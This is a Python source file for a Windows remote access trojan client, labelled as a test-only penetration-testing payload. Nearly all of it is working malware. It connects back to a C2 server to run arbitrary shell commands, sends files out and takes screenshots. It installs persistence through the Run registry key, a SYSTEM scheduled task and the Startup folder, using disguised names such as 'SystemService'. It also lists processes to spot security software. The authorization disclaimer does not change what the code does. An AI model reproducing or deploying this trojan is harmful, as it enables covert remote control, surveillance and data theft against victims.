"""
═══════════════════════════════════════════════════════════════════════════════
WINDOWS REMOTE ACCESS TROJAN - CLIENT PAYLOAD (TEST ONLY)
═══════════════════════════════════════════════════════════════════════════════
⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY - ISOLATED LAB ENVIRONMENT ONLY
⚠️  UNAUTHORIZED USE IS ILLEGAL - REQUIRES WRITTEN AUTHORIZATION

This trojan demonstrates:
1. Remote Command Execution
2. File Operations (upload/download)
3. System Information Gathering
4. Persistence Mechanisms
5. C2 Communication
6. Process Management
7. Registry Manipulation (Windows)
8. Screenshot Capture
9. Keylogging (Optional)
10. Data Exfiltration

═══════════════════════════════════════════════════════════════════════════════
"""

import socket
import subprocess
import os
import sys
import json
import base64
import platform
import time
import threading
from pathlib import Path
import struct
import psutil
import getpass

# For Windows-specific operations
if platform.system() == "Windows":
    import winreg
    import ctypes
    from PIL import ImageGrab  # For screenshots

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION - MODIFY THESE FOR YOUR TEST ENVIRONMENT
# ═══════════════════════════════════════════════════════════════════════════════

C2_SERVER = "192.168.1.100"      # Your C2 server IP (attacker machine)
C2_PORT = 4444                    # C2 server port
RECONNECT_INTERVAL = 10           # Seconds between reconnection attempts
CHUNK_SIZE = 4096                 # File transfer chunk size

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1: SYSTEM INFORMATION GATHERING
# ═══════════════════════════════════════════════════════════════════════════════

class SystemInfo:
    """Gather system information about the target"""
    
    @staticmethod
    def get_info():
        """Collect comprehensive system information"""
        try:
            info = {
                "hostname": platform.node(),
                "os": platform.system(),
                "os_version": platform.version(),
                "architecture": platform.architecture()[0],
                "processor": platform.processor(),
                "python_version": platform.python_version(),
                "username": getpass.getuser(),
                "cpu_count": psutil.cpu_count(),
                "total_memory": psutil.virtual_memory().total,
                "available_memory": psutil.virtual_memory().available,
            }
            return json.dumps(info, indent=2)
        except Exception as e:
            return f"Error gathering system info: {e}"

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2: COMMAND EXECUTION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class CommandExecutor:
    """Execute system commands on the target machine"""
    
    @staticmethod
    def execute(command):
        """
        Execute arbitrary system command
        
        Process:
        1. Parse command string
        2. Execute using subprocess
        3. Capture output (stdout + stderr)
        4. Return results to C2
        """
        try:
            # Use shell=True to allow complex commands (piping, redirection, etc)
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr
            return output if output else "[No output]"
        except subprocess.TimeoutExpired:
            return "[Command timeout - took too long]"
        except Exception as e:
            return f"[Error executing command: {e}]"

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3: FILE OPERATIONS (UPLOAD/DOWNLOAD)
# ═══════════════════════════════════════════════════════════════════════════════

class FileOperations:
    """Handle file upload/download operations"""
    
    @staticmethod
    def send_file(socket_connection, file_path):
        """
        Send file from target to attacker
        
        Process:
        1. Check if file exists
        2. Get file size
        3. Send size header to attacker
        4. Send file contents in chunks
        5. Confirm transfer completion
        """
        try:
            if not os.path.exists(file_path):
                socket_connection.send(b"FILE_NOT_FOUND")
                return False
            
            file_size = os.path.getsize(file_path)
            
            # Send file metadata
            metadata = {
                "filename": os.path.basename(file_path),
                "size": file_size
            }
            socket_connection.send(json.dumps(metadata).encode() + b"\n")
            
            # Send file in chunks
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    socket_connection.send(chunk)
            
            return True
        except Exception as e:
            socket_connection.send(f"Error: {e}".encode())
            return False
    
    @staticmethod
    def receive_file(socket_connection, save_path):
        """
        Receive file from attacker
        
        Process:
        1. Receive file metadata
        2. Create destination directory
        3. Write received data to file
        4. Verify file integrity
        """
        try:
            # Receive metadata
            metadata_data = b""
            while b"\n" not in metadata_data:
                chunk = socket_connection.recv(1024)
                if not chunk:
                    return False
                metadata_data += chunk
            
            metadata = json.loads(metadata_data.decode().split("\n")[0])
            file_size = metadata["size"]
            
            # Create directory if needed
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            
            # Receive and write file
            received = 0
            with open(save_path, 'wb') as f:
                while received < file_size:
                    chunk = socket_connection.recv(CHUNK_SIZE)
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            
            return True
        except Exception as e:
            return False

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 4: PERSISTENCE MECHANISMS (AUTO-START)
# ═══════════════════════════════════════════════════════════════════════════════

class Persistence:
    """Ensure trojan survives system reboot"""
    
    @staticmethod
    def add_registry_startup_windows(executable_path):
        """
        Add trojan to Windows startup via Registry
        
        Registry Location:
        HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        
        Result: Trojan auto-starts when user logs in
        """
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                key,
                "SystemService",  # Entry name in registry
                0,
                winreg.REG_SZ,
                executable_path
            )
            winreg.CloseKey(key)
            return True
        except Exception as e:
            return False
    
    @staticmethod
    def add_task_scheduler_windows(executable_path):
        """
        Add trojan via Windows Task Scheduler (More stealthy)
        
        Command creates hidden scheduled task that runs every minute
        """
        try:
            command = f'''
            schtasks /create /tn "SystemUpdate" /tr "{executable_path}" /sc minute /mo 1 /f /ru SYSTEM
            '''
            subprocess.run(command, shell=True, capture_output=True)
            return True
        except:
            return False
    
    @staticmethod
    def add_startup_folder_windows(executable_path):
        """
        Copy trojan to Windows Startup folder
        
        Location: C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
        
        Result: Runs when Windows starts
        """
        try:
            startup_dir = Path.home() / "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            import shutil
            shutil.copy(executable_path, startup_dir / "SystemService.exe")
            return True
        except:
            return False

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5: SCREEN CAPTURE (SURVEILLANCE)
# ═══════════════════════════════════════════════════════════════════════════════

class Surveillance:
    """Capture system activity"""
    
    @staticmethod
    def take_screenshot(save_path="screenshot.png"):
        """
        Capture screenshot of victim's screen
        
        Uses PIL/Pillow to grab screen content
        """
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(save_path)
            return True
        except Exception as e:
            return False
    
    @staticmethod
    def get_running_processes():
        """
        Get list of running processes
        
        Useful for:
        - Identifying security software
        - Finding target applications
        - Process manipulation
        """
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'user': proc.info['username']
                    })
                except:
                    pass
            return json.dumps(processes, indent=2)
        except Exception as e:
            return f"Error: {e}"

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6: PROCESS MANAGEMENT & INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class ProcessManager:
    """Manage system processes"""
    
    @staticmethod
    def kill_process(pid):
        """Terminate a process by PID"""
        try:
            os.kill(pid, 9)
            return f"Process {pid} terminated"
        except Exception as e:
            return f"Error: {e}"
    
    @staticmethod
    def start_process(command):
        """Start a new process"""
        try:
            subprocess.Popen(command, shell=True)
            return "Process started"
        except Exception as e:
            return f"Error: {e}"

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 7: MAIN C2 COMMUNICATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class RemoteAccessTrojan:
    """Main trojan class - handles C2 communication and command execution"""
    
    def __init__(self, server, port):
        self.server = server
        self.port = port
        self.socket = None
        self.connected = False
        self.executor = CommandExecutor()
        self.file_ops = FileOperations()
        
    def connect(self):
        """
        Establish connection to C2 server
        
        Process:
        1. Create TCP socket
        2. Attempt connection to C2
        3. Send system info on successful connection
        4. Retry if connection fails
        """
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((self.server, self.port))
            self.connected = True
            
            # Send initial system info to C2
            initial_info = SystemInfo.get_info()
            self.socket.send(f"[CONNECTED] {initial_info}".encode())
            
            return True
        except Exception as e:
            self.connected = False
            return False
    
    def receive_command(self):
        """
        Receive command from C2 server
        
        Expects JSON format:
        {
            "command": "cmd_type",
            "args": "command_arguments"
        }
        """
        try:
            data = self.socket.recv(4096)
            if not data:
                return None
            return data.decode()
        except socket.timeout:
            return None
        except Exception as e:
            self.connected = False
            return None
    
    def execute_command(self, cmd_type, args=""):
        """
        Execute command based on type
        
        Command Types:
        - shell: Execute system command
        - sysinfo: Get system information
        - upload: Receive file from attacker
        - download: Send file to attacker
        - screenshot: Capture screen
        - processes: List running processes
        - kill_process: Terminate process
        - start_process: Start new process
        - persist: Install persistence mechanism
        - list_files: List directory contents
        - exit: Shutdown trojan
        """
        try:
            if cmd_type == "shell":
                output = self.executor.execute(args)
            
            elif cmd_type == "sysinfo":
                output = SystemInfo.get_info()
            
            elif cmd_type == "upload":
                # Save file on target
                self.file_ops.receive_file(self.socket, args)
                output = f"File received: {args}"
            
            elif cmd_type == "download":
                # Send file to attacker
                self.file_ops.send_file(self.socket, args)
                output = f"File sent: {args}"
            
            elif cmd_type == "screenshot":
                Surveillance.take_screenshot("temp_ss.png")
                self.file_ops.send_file(self.socket, "temp_ss.png")
                os.remove("temp_ss.png")
                output = "Screenshot sent"
            
            elif cmd_type == "processes":
                output = Surveillance.get_running_processes()
            
            elif cmd_type == "kill_process":
                output = ProcessManager.kill_process(int(args))
            
            elif cmd_type == "start_process":
                output = ProcessManager.start_process(args)
            
            elif cmd_type == "persist":
                # Install persistence mechanism
                current_exe = sys.executable
                if Persistence.add_registry_startup_windows(current_exe):
                    output = "Persistence installed via Registry"
                else:
                    output = "Failed to install persistence"
            
            elif cmd_type == "list_files":
                try:
                    files = os.listdir(args)
                    output = json.dumps(files, indent=2)
                except Exception as e:
                    output = f"Error: {e}"
            
            elif cmd_type == "exit":
                output = "Exiting..."
                self.connected = False
            
            else:
                output = "Unknown command"
            
            return output
        
        except Exception as e:
            return f"Error executing command: {e}"
    
    def send_response(self, response):
        """Send command execution result back to C2"""
        try:
            self.socket.send(response.encode())
        except:
            self.connected = False
    
    def run(self):
        """
        Main trojan loop
        
        Process:
        1. Attempt connection to C2
        2. Receive commands in infinite loop
        3. Execute commands
        4. Send results back
        5. Reconnect if connection drops
        """
        while True:
            if not self.connected:
                # Try to connect, retry every 10 seconds
                if self.connect():
                    print("[+] Connected to C2 server")
                else:
                    print("[-] Connection failed, retrying...")
                    time.sleep(RECONNECT_INTERVAL)
                    continue
            
            # Receive and execute commands
            command_data = self.receive_command()
            
            if command_data is None:
                # Connection lost, try to reconnect
                self.connected = False
                continue
            
            try:
                # Parse JSON command
                cmd = json.loads(command_data)
                cmd_type = cmd.get("command", "")
                args = cmd.get("args", "")
                
                # Execute command
                output = self.execute_command(cmd_type, args)
                
                # Send result back to C2
                self.send_response(output)
                
                # Exit if requested
                if cmd_type == "exit":
                    break
            
            except json.JSONDecodeError:
                # Invalid command format
                self.send_response("Invalid command format")
            except Exception as e:
                self.send_response(f"Error: {e}")

# ═══════════════════════════════════════════════════════════════════════════════
# EXECUTION
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    """
    Start trojan client
    
    This will:
    1. Connect to C2 server
    2. Send system information
    3. Wait for and execute commands
    4. Maintain connection with reconnect capability
    """
    print("[*] Starting Remote Access Trojan Client...")
    print(f"[*] Targeting C2 Server: {C2_SERVER}:{C2_PORT}")
    
    trojan = RemoteAccessTrojan(C2_SERVER, C2_PORT)
    trojan.run()
